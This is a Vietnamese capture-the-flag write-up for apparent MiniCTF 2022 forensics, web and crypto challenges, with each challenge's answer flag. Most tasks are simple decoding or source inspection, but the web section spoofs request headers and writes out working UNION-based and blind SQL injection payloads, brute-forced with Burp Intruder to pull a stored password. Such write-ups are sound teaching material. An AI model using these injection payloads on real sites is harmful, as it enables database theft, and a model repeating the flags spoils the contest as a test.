Flag: `ISPCTF{w1bu_n3v3r_d13_1337}`

# Forensics: OnlyFan
#### Challenge

Đây rồi, con đường dẫn đến nơi trú ngụ của Xipan, đi theo con đường này chúng ta sẽ tìm được hắn.

[round.png](https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/OnlyFan/Round.png)

#### Solution

Mở ảnh lên ta thấy ảnh bị xoáy nặng.

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/OnlyFan/Round.png height=300px width=500px>


Dùng photoshop để xoáy lại ảnh (ở đây mình dùng photopea) và lấy được flag

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/OnlyFan/onlyfan.png height=300px width=500px>

Flag: `ISPCTF{r0und_n_r0und_1908absc}`

# Web: PHP Moon Cake
#### Challenge
Yummy bánh trung thu ngon thật đấy. Có gì ngon nghẻ đằng sau lớp áo đẹp đẽ đó vậy?
#### Solution

Bài cho ta một trang web đăng nhập hoặc đăng ký đăng ký và đăng nhập bình thường nhưng chẳng có gì cả.<br>
Thông thường các trang web sẽ được viết bởi các file .html (file cấu trúc của web ), .css( file biểu diễn đồ họa cho web), .js (các tính năng khác cho web), và chúng ta có thể đọc được các file public qua inspect (kiểm tra) web, đọc các file public ở phần Source trên thanh công cụ của inspect. Đọc source ở phần element (cũng như file index.html trong Source) ta thấy flag:

`ISPCTF{134rn1n9_web_15_3z}`

<img src= https://github.com/dnamgithub33/WUMiniCTF-2022/blob/main/fakeflag.PNG>

Nhưng dây là flag sai, tiếp tục đọc source của file style_in.css ta thấy flag:

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/trueflag.png>

Flag: `ISPCTF{m00n_c4k3_15_t00_sw33t}`

# Web: Get Out Of Here 
#### Challenge
<p>Thật may mắn có những chú robot chưa bị dính code bẩn và chúng đang chỉ đường cho ta. Đi theo thử xem sao!<p>

Link web: [http://174.138.21.217:8021/](http://174.138.21.217:8021/)

#### Solution
Mở web lên ta thấy không có gì cả. Có cái link quay lại nhưng mà nó lại là lừa để mình bị Rick Roll.

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Get%20Out%20Of%20Here/get_out_1.png>

Kéo xuống cuối ta thấy dòng chữ F12. Có nghĩa là kiểm tra source của web. Ở đây sẽ có những thành phần của 1 trang web để trang web hoạt động một cách bình thường. Những file trong source của web là những file public, thường là các file html (file mang cấu trúc của web), file css (file đồ hoạ cho web), file js (bổ trợ những tính năng cho web). 

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Get%20Out%20Of%20Here/get_out_2.png >

Ấn F12 (inspect) ta thấy luôn flag ở phần Element. Do flag có thể được giấu trong từng file bằng cách để flag ở comment của dạng file đó, để flag không trực tiếp hiện thẳng trên trang web mà mình có thể nhìn thấy.

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Get%20Out%20Of%20Here/get_out_3.png>

Flag: `ISPCTF{jU5t_lnsp3ct_01012021dad}`

# Web: Find Flag
#### Challenge
<p> Xipan có sở trường thích ẩn ẩn hiện hiện, code của hắn thật khó tìm. Nó có thể nằm ở đâu được nhỉ?<p>

Link web: [http://174.138.21.217:8022](http://174.138.21.217:8022)

#### Solution

Mở web lên, thấy 1 trang log in, nhập các thứ không vào được. Thử inspect có flag nhưng lại là flag fake.

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Find%20Flag/find_flag_1.png>

Mình biết được rằng các web đều sẽ có 1 phần của người viết trang web được ẩn đi, không cho mình biết. Khi tìm hiểu về những loại file ẩn đó, mình tìm ra được có thể gọi ngay các file đó trên URL của web, chính là /(tên file). Các file giấu đi thường có format nhất định: /flag.txt; /robots.txt; /.DS_store; /.htaccess . Thử nhập /flag.txt thêm vào đường link của web. Thấy được flag 

<img src=https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Find%20Flag/find_flag_2.png>

Flag: `ISPCTF{HAv3_Fnu_Vvlt5_W3b}`

# Web: Keiichi
#### Challenge

Kho báu bị ẩn giấu trong mê cung, chắc chắn phải có cách tìm ra nó.

#### Solution

Mới đầu vào ta chỉ thấy một bức ảnh làm background, thử inspect xem sources thì ối dồi ôi luôn, một đống code html, có vẻ như flag được giấu ở đây. <br>
`Ctrl F ISPCTF` ta tìm được phần đầu của Flag: `ISPCTF{H3_1S_C`

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Keiichi/images/1.png)

Nếu như phần Flag còn lại cũng nằm trong source này thì chắc chắn là không tìm ra được, cả source đều là html, hoàn toàn không thể khai thác được gì.<br>
Lúc này ta cần nghĩ tới file ẩn. Truớc khi nghĩ tới các cách để tìm file ẩn như Bruteforce. Ta cần kiểm tra file `Robots.txt` :))<br>

Tệp `robots.txt` cho trình thu thập dữ liệu của công cụ tìm kiếm biết có thể truy cập vào những URL nào trên trang web của bạn. Tệp này chủ yếu dùng để ngăn trình thu thập dữ liệu gửi quá nhiều yêu cầu cho trang web; `đây không phải là cơ chế để ẩn một trang web khỏi Google`. Để ẩn một trang web khỏi Google, hãy chặn lập chỉ mục bằng noindex hoặc bảo vệ trang đó bằng mật khẩu.

Boom 

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Keiichi/images/2.png)

Disallow: `0m3B4ck_Y`, file này đã bị web ẩn đi, và nhìn nó cũng giống với 1 phần của Flag phết nhỉ :))

Flag lúc này có thêm 1 phần mới: `ISPCTF{H3_1S_C0m3B4ck_Y`<br>

Truy cập vào file `0m3B4ck_Y` bị ẩn này ta thấy trang có nội dung sau:<br>

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Keiichi/images/3.png)

Encode: `MHVfQ2FuX2ZpbmRfaGltfQ==`

Nhìn đoạn mã kia có vẻ bị như message ban đầu bị `encode Base64`, dễ dàng decode với <a href="https://kt.gy/tools.html#conv/0u_Can_find_him%7D">kt.gy</a> <br>

Ta thu được kết quả:<br>

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Keiichi/images/4.png)
`0u_Can_find_him}`

Ghép các phần tìm được, ta có Flag hoàn chỉnh: <br>

Flag: `ISPCTF{H3_1S_C0m3B4ck_Y0u_Can_find_him}`


# Web: ISP Info

#### Challenge

Ôi, chúng ta gặp rắc rối không nhỏ rồi, hàng rào bảo mật đang ngăn cản ta. 

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/0.png)


#### Solution

Khi Inspect trang, một message bị ẩn xuất hiện

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/1.png)

Có vẻ message này chỉ chấp nhận `User-agent` là `isper`, bật burpsuite và thay đổi `user-agent` thành `isper`

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/2.png)

Một message nữa đã xuất hiện, server đang muốn kiểm tra xem nguồn đưa bạn đến trang web này có được cho phép hay không <br>

Thêm 1 trường nữa cho header: `referer: https://www.facebook.com/ATTT.PTIT`

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/3.png)

Sau khi send, ta lại nhận được một message nữa: `'Địa chỉ localhost của bạn?'` chắc chắn là `127.0.0.1`

Server sẽ forward nếu cung cấp đúng IP, thêm 1 trường nữa vào header: `X-ForWarded-For: 127.0.0.1`
<br>Nhấn send ta được :

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/4.png)  

Lần này server yêu cầu ngày tháng, và ngày tháng đó chính là ngày thành lập khoa ATTT. 
- Osint theo link gợi ý ta tìm được bài viết có ngày, tháng, năm: <a href="https://portal.ptit.edu.vn/hoc-vien-cong-nghe-buu-chinh-vien-thong-thanh-lap-khoa-an-toan-thong-tin/">Link bài viết</a>

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/5.png)

 Thêm trường `date` có dạng sau: `date: Tue, 05 Apr 2022 11:11 GMT`
 Sau đó send: ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/6.png)

 Lần này lại là `'bạn có biết tiếng Việt không?'`<br>Ta chỉ cần sửa lại phần `Accept-Language` thành `vi-VN,vi`<br>
 Nhưng mà send xong không ra cái gì :( , author thật nhiễu sự, phải là `vi-vi,vi` thì mới được cơ (chỉ muốn xin 100 điểm hint của các bạn thui ^^).<br>
 Và cuối cùng `Accept-Language: vi-vi,vi`  
 Sau khi send thì ta có được flag:

![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/ISP%20Info/images/7.png)

Flag: `ISPCTF{N0w_Y0u_Kn3w_4b0ut_ISP_Y0ur_W3lC0m3}`

# Web: SQLi Blind
#### Challenge

#### Solution

##### Bước 1 
 Mới đầu vào, đạp vào mắt là trang đăng kí, đăng nhập. Chưa cần phải nghĩ tới hack, hãy sử dụng web như một client chân chính.
- ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/2.png)

 Đầu tiên là tạo tài khoản. Tạo 1 username: `asd`, password: `asd`. Sau đó đăng nhập, ta có 1 `alert` hiện ra:
- ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/1.png)

 `login success` và không có flag, rồi sao? :( <br>
 Để ý ở phần `Footer`, cho `robots.txt`
- ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/3.png)<br>
Truy cập vào ta được gợi ý<br>
- ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/4.png)
- Có 1 file ẩn :  `brut3f0rc3`
-  Có thứ gì đó trong :`'information schema, columns , tables'`<br> Vậy là sẽ tìm được `column_name` trong `columns`, `table_name` trong `tables`. Ok vào file `brut3f0rc3` trước đã

##### Bước 2

- <image src="https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/5.png" width="50%"> <br>Vào xong thấy ối dồi ôi luôn :(

 Trong khi trải nghiệm web, bạn sẽ phát hiện ra, các button order sản phẩm đã tạo ra 1 truy vấn có thể nhìn thấy trên Url. Các truy vấn này có thể được truy vấn tới tới databases, hoặc là không :(<br>
- <image src="https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/6.png" width="70%">
- Khi nhấn `women`  truy vấn `'?category=women'` được gọi.

 Ta thấy các sản phẩm được xuất ra sau khi truy vấn, như vậy nếu như ở đây có lỗ hổng, các thông tin chúng ta cần biết như `'column_name'` `'table_name'` cũng sẽ được hiện ra đây ở đây, nếu như select đúng :>

 Vậy bây giờ bắt đầu như nào? :(
-  Bật BurpSuite lên đã rồi làm gì thì làm :(
-  Ném request vào Repeater, ta thấy  số cột trả về là `4`
-  ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/7.png)
-  Biết được số cột trả về là 4, nếu như ta có thể ta có thể tiêm được `union` vào truy vấn này, ta có thể tìm kiếm thông tin như `colum_name,table_name` trong database `information_schema` như đã được gợi ý.

 Vậy kiểm tra xem `union` có thực sự hoạt động hay không<br>
 Ta thử với payload sau:  `category=women'union+select+null,null,null,null%23`
- <image src="https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/8.png"><br>
   Sản phẩm trả về gồm 4 sản phẩm của `women` và 1 sản phẩm `NULL` được select. Như vậy có thể khai thác bằng cách tiêm `union` vào truy vấn.
-  Trong BurpSuite cũng có thể thấy, số hàng trả về là 5
  -  <image src="https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/9.png"> 
-  Kiểm tra giá trị trả về, xem cột nào trong 4 cột chấp nhập kiểu chuỗi, từ đó có thể tiêm payload vào. Làm như sau: 
  -  Với 2 đối số đầu tiên, ta thay `Null` bằng chuỗi `ngn`, nhấn send và sản phẩm của `NULL` cũng trả ra 2 chuỗi `ngn`. vậy ta sẽ khai khác theo 2 đối số này
  -  <image src="https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/10.png">

 Vậy thì bây giờ làm sao để tìm được Flag? Chắc chắn cái bảng chứa Flag nó sẽ nằm ở đâu đó trong `tables`, cột chứa Flag sẽ nằm đâu đó trong `columns`.
 Vậy thì tiếp tục đi tìm các `table_name` và `column_name` thôi.<br>
 Nhưng tìm như nào? :( <br>

 > Tìm `table_name` trong `tables`: 
 -  Ta có truy vấn: <br>
   > `category=women'union+select+table_name,null,null,null+from+information_schema.tables%23`
   -  Ném payload lên truy vấn ta thấy một đống tên bảng được hiện ra:
   -  <image src="https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/11.png" width="70%">
   -  Giờ thì tìm bảng nào có ích thôi :(
   -  Khi kéo đến cuối ta tìm được 2 bảng khả nghi là `products` và `sqli_blind` <br>
      - `products` thì chắc là bảng chứa sản phẩm
      - `sqli_blind` có thể là bảng chứa flag. Note lại tên bảng là `sqli_blind` cho khỏi quên :(
> Giờ thì đi tìm tên cột:
 -  Ta có truy vấn: <br>`category=women'union+select+column_name,null,null,null+from+information_schema.columns%23`<br>
    Ném payload lên truy vấn ta thấy một đống tên cột được hiện ra, kèm với đó là rất nhiều cột fake, kéo xuống dưới cùng, ta tìm được các cột quan trọng như:
    -  `username`,` password` => Flag chắc chắn nằm trong đây luôn =))
    -  `category`,` image`,` price`

 Giờ thì sao? <br>
 Ta đã tìm được tên bảng là `sqli_blind`, tên 2 cột là `username`,` password`.<br>
 Cùng với 2 đối số chấp nhận kiểu string, `select` chúng ra thôi chứ còn gì nữa :))<br>
   > =>Payload: `category=women'union+select+username,password,null,null+from+sqli_blind%23`

 Nhưng đời không như là mơ, cứ tưởng thế là xong thì auth lại chặn truy vấn, cũng phải thôi, đề bài là `sqli_blind` mà :( <br>
 - Ta thu được username = `myFlag`
 - ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/14.png) 

  Hiện tại, ta đang có `table_name` = `sqli_blind`, `username` = `myFlag` và `password` = `''`<br>
  Nhiệm vụ bây giờ là đi tìm `password`.<br>
  Auth nói là không còn gì ở đây nữa, thì bạn cứ tạm tin là như vậy đi, với lang thang ở trang này cũng đã quá đủ rồi, trở lại trang đăng ký đăng nhập để khai thác `Blind` nào :( <br>

##### Bước 3

 `Blind` nôm na là cách để đưa dữ liệu vào 1 hòm đen mà ta không biết trong đó nó xử lý thế nào, bằng cách đưa tất cả các trường hợp có thể có vào và so sánh kết quả đầu ra của chúng với điều kiện đúng, nếu đầu ra khớp với điều kiện đúng thì tương ứng với dữ liệu đầu vào của nó cũng là đúng. Nghe giống `bruteforce` nhỉ :( .  

 Tức là bây giờ ta cần `bruteforce` ra `password`<br>
Nhưng trước hết ta cần biết độ dài của `password` bằng bao nhiêu.<br>
 - Đưa request vào repeater để kiểm tra payload có chạy chuẩn không :(
    -  Ta đang dùng `username, password` đã được đăng kí, nên nếu một truy vấn đúng thì nội dung trả về phải có message `login success, not flag for you`
     - <image src="https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/17.png">
     - Kết hợp Mệnh đề `and` để đảm bảo truy vấn đúng thì `select` phải đúng.
     - Giả sử truyền vào một `username` sai, kết quả trả về sẽ là:<br>
     - ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/18.png)

 Vậy là ta đã xác định được truy vấn đúng, tiến hành đưa request vào intruder, để tìm độ dài `password`.
 -  Trong intruder ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/15.png)
 -  Tạo payload như trong `repeater` và thêm nội dung cần kiểm tra là độ dài `password`: 
   - > `username=asd'+and+(select+'isp'+from+sqli_blind+where+username='myFlag'+and+length(password)=§1§)='isp&password=asd&login=`
   -  ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/16.png)<br>
   -  Thêm 1 biến chạy như trong hình.
   -  Cho biến `run` chạy từ 1 -> 100 (chắc password chỉ tầm 100 đổ về thui )     
     -  ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/19.png)
   -  Nếu như độ dài của `password` đúng bằng giá chị chạy cả biến `run` thì nội dung trả về sẽ là `login success`, nếu không thì là `username or password is wrong`.
   -  Vậy để dẫn nhận biết là request gửi đi là đúng hay sai, ta thêm `grep-match` với nội dung `'success'`
     - ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/20.png)
> Nhấp `start attack`

 -  Tìm hàng nào có cột `success`=`1`. Vậy là đã tìm được độ dài của `password` = `60`
   - ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/21.png)

##### Bước 4

 Tiếp theo đi tìm `password` bằng cách cắt từng kí tự của `password` từ ký tự đầu đến ký tự cuối, để đem so sánh với bảng chữ cái từ `a->z` và `0->9`.<br>
 Mục đích của việc này là ta chỉ có thể đem so sánh ký tự, kết quả đúng thì trả về `login success`, sai thì `username or password is wrong`.<br>

> Payload: `username=asd'+and+(select+substring(password,§1§,1)+from+sqli_blind+where+username='myFlag')='§c§&password=asd&login=`
   - ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/22.png)
  - > Biến `§1§` đề cắt kí tự thứ `§1§` của `password` ra, `password` như 1 xâu ký tự, mỗi ký tự sẽ được đem so sánh với biến `§c§`
  - > Chọn kiểu tấn công là `cluster bomb`
  - > Biến `$1$` chọn payload type là `Numbers` chạy từ `1->60`, vì length password = 60;
  - > Biến `§c§` chạy payload type là `Bruteforce` từ `a->z, 0->9`
  - > Mỗi một ký tự được cắt ra bới chỉ số `$1$` sẽ được so sánh với tất cả giá trị trong `a->z, 0->9`
  - > Nhớ `grep-match` cụm từ `success` để biết ký tự nào được `blind` đúng.
  - > Cuối cùng nhấn `start-attack` 

  - Nếu bạn không có burpPro thì khoảng vài tiếng sẽ cho ra kết quả sau:
   - ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/23.png)
   -  Loại bỏ tất cả các hàng không match được với `success`
   -  Sắp xếp lại `payload1` từ 1->60 đi kèm với `payload2`
    -  ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/24.png)
    -  Những 60 ký tự cơ, sau đó thì copy lên <a href="https://kt.gy/tools.html#conv/ISPCTF%7BBl1nd_brut3f0rc3_01fg6%7D">kt.gy</a> để dehex vậy là ta có Flag :>
    - ![](https://raw.githubusercontent.com/giangnamG/wu-miniCTFd22/master/Web/Sqli%20Blind/images/25.png)

>Flag: `ISPCTF{Bl1nd_brut3f0rc3_01fg6}`

# Crypto: Do you know what is basecrack
#### Challenge
 
 <p> Đôi khi code bẩn cũng cần được bóc tách mới tìm thấy được tinh hoa. Bạn có đủ kiên trì chứ???<p>
 
[crypto.txt](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/crypto.txt)

#### Solution

Theo như tên đề bài chúng ta hãy lên GOOGLE tìm tên tool basecrack 

[tool basecrack](https://basecrack.herokuapp.com/)

<p> Giải mã liên tục lặp đi lặp lại với Basecrack. Cuối cùng, ta sẽ tìm ra được flag<p>

Flag: `ISPCTF{1_you_kn0w_Base_Crack}`

# Crypto: Caesar Knight
#### Challenge
Một chút nữa thôi là chúng ta có thể lấy được kho báu để đối phó với Xipan rồi. Tiến lên thôi nào các bạn!!!

[flag_here.txt](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/Caesar%20Knight/Flag_here.txt)

#### Solution

Mở lên thấy 1 đoạn mã lạ

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Caesar%20Knight/knight_1.png>

Dựa theo đề bài, mình tìm tool decode Caesar và xử lí mật mã với key=5 có được flag 

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Caesar%20Knight/knight_2.png>

Flag: `ISPCTF{h3ll0_ISP_1337}`

# Crypto: UwU
#### Challenge

Không ngờ rằng xipan lại cẩn thận thế này. Bốp và các bạn phải cố gắng hơn thôi.

#### Solution

Challenge này cung cấp một đoạn mã khá ngắn. Nếu như không nhận diện được ngay đoạn mã là gì thì có thể dùng google để tìm các trang web có thể giải mã:

![search](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/UwU/1.png)

Có thể vào luôn trang web đầu tiên để thử, ở đây mình thử paste tên của challenge vào để thử tìm ra được gì:

![search](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/UwU/2.png)

Mình tìm thấy khá nhiều mã có tên gần giống với lại tên challenge. Mình chọn mã `UU` để thử và tìm ra flag:

![search](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/UwU/3.png)

Flag: `ISPCTF{UU_3ncode_not_UwU}`

# Crypto: Love Song 
#### Challenge
Ôi, chúng ta phải làm gì để có thể kết nối với Bốp đây?

[What_is_it.mp3](https://github.com/Dongkong1908/MiniCTF-2022/blob/main/Love%20Song/What%20is%20it_.mp3?raw=true)

#### Solution

Mở file lên nhận ra được đây là mã Morse. Sử dụng tool [này](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) để đọc được mã Morse đó. Nhận kết quả: 

<img src= https://raw.githubusercontent.com/Dongkong1908/MiniCTF-2022/main/Love%20Song/what.png>

Flag: `ISPCTF{HOW_CAN_YOU_FIX_IT_?}`

# Crypto: You are noob!!
#### Challenge

Hừm, các dấu chân khả nghi rải rác quanh đây! Nhất định tín hiệu ở đâu đó không xa.

#### Solution

Đề cho ta 1 đoạn text với dòng chữ:
`aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS80Y2MzZXNzX20zLw==`

Với kinh nghiệm của mình thì mã có dấu "=" ở cuối thì 90% là Base64 rồi!, mình decode và nhận được:

Sau khi quét thì nhận được 1 bức ảnh với 1 dòng chữ bên dưới trông có vẻ giống form Flag nhưng đã bị mã hóa

![1](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/You%20are%20noob/S1.png)

Link dẫn tới trang cá nhân instagram của 1 hecker lỏd, hắn bảo rằng "Đố anh bắt được em"

![2](https://github.com/LeeDiay/MiniCTF_2022/raw/main/You%20are%20noob/S2.png)

Phần tiểu sử có chứa các đoạn mã, đoạn `173 83 80 67 84 70 123 99 52 84 95 77 51` mình đã đoán được đây là mã Decimal, decode thì ra được đoạn đầu của Flag:

![3](https://github.com/LeeDiay/MiniCTF_2022/raw/main/You%20are%20noob/S3.png)

Còn đoạn mã phía sau chắc chắn là Base64 rồi, decode thì ra được: 

![4](https://github.com/LeeDiay/MiniCTF_2022/raw/main/You%20are%20noob/S4.png)

Link dẫn tới 1 trang web lại có thêm thông tin:

![5](https://github.com/LeeDiay/MiniCTF_2022/raw/main/You%20are%20noob/S5.png)

Khúc này, cứ ngỡ như mình đã tìm thấy đoạn còn lại của Flag, nhưng không, sau khi thử hơn 50 lần thì nó vẫn báo WA...
Phía bên dưới còn 1 đoạn mã Base64 nữa nên mình sẽ tiếp tục nghiên cứu thêm nó, mã hóa thì ta đc 1 đường link dẫn tới 1 bức ảnh: 

![6](https://github.com/LeeDiay/MiniCTF_2022/raw/main/You%20are%20noob/S6.png)

Phần tiêu đề của link này là "9R34t_w4y" làm mình lại bị mắc cú lừa lần 2, thử hơn chục lần vẫn sai...
Nhìn thấy ảnh ông chú áo vàng đã bị quay sang trái với 1 tay là chữ "DEC" và 1 tay là chữ "RAIL". Ngẫm 1 lúc lâu thì mình cũng đã hiểu được ẩn ý của tác giả: đó là Flag được ghép từ 2 phần. Một phần là mã Decimal từ ban đầu, và phần còn lại là "_un1__4?fC}" chắc chắn bị mã hóa bằng code "Rail Fence". Tốn 100 xu mua hint thì mình đã có key để giải bằng 3. Lúc này mình chỉ việc decode và sub flag thôi :D

![7](https://github.com/LeeDiay/MiniCTF_2022/raw/main/You%20are%20noob/S7.png)

Flag: `ISPCTF{c4T_M3_1f_u_C4n?}`

# Crypto: ROTTOR

#### Challenge
<p>Xipan đã tạo ra mê cung nhằm đánh lạc hướng chúng ta, các bạn hãy theo Bốp để không bị lạc nhé!<p>

[picture.png](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/ROTTOR/Sau.png)

![search](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/ROTTOR/Sau.png)

#### Solution

<p>Tác giả đã cho ta 1 bức ảnh trông khá ngộ nghĩnh, trông khá giống là 1 mã QR, nhưng khi quét thì không được gì?? Lúc này, hint nói rằng "Bạn có biết định dạng chuẩn của 1 mã QR không?" thì sau 1 hồi học về QR thì mình biết mã này bị khuất mất 3 ô vuông định vị ở 3 góc. Việc cần làm lúc này là chèn thêm 3 ô vuông đó vào cho đúng vị trí của nó thôi :D Sau khi photoshop thì ta đã có 1 mã QR hoàn chỉnh:<p>

![search](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/ROTTOR/Goc.png)

Sau khi quét thì nhận được 1 bức ảnh với 1 dòng chữ bên dưới trông có vẻ giống form Flag nhưng đã bị mã hóa

![search](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/ROTTOR/Quet1.png)

Lúc này mình mới nhớ tên Chall là ROTTOR nên chắc rằng nó có liên quan tới chìa khóa để giải mã dòng chữ kia, tra thêm 1 tí thì mình biết nó được mã hóa bằng mã ROT13

![search](https://raw.githubusercontent.com/LeeDiay/MiniCTF_2022/main/ROTTOR/Fi.png)

Flag: `ISPCTF{0h_mY_90D_y0u_931_i1}`
